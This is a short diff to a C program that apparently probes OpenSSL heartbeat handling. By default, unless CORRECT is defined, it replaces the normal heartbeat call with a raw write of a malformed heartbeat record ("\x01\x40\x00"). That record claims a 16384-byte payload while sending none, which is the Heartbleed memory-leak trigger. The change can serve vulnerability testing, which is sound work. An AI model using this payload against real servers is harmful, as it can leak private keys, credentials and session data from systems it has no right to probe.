@@ -86,6 +86,8 @@ dump_bytes(int write_p, int version, int content_type,
     dumpargs->is_heartbeat_seen = 1;
 }
 
+int ssl3_write_bytes(SSL *s, int type, const void *buf_, int len);
+
 /****************************************************************************
  ****************************************************************************/
 void 
@@ -147,8 +149,12 @@ openssltest(const char *target_string)
     /*
      * Send the hearbeat request
      */
+#ifdef CORRECT
     SSL_ctrl(ssl, SSL_CTRL_TLS_EXT_SEND_HEARTBEAT, 0, 0);
-    
+#else
+   ssl3_write_bytes(ssl, TLS1_RT_HEARTBEAT, "\x01\x40\x00", 3);
+#endif
+
     /*
      * Configure callbacks into the OpenSSL libraries to peak on the hearbeat
      * data, because there is no normal API to get it.
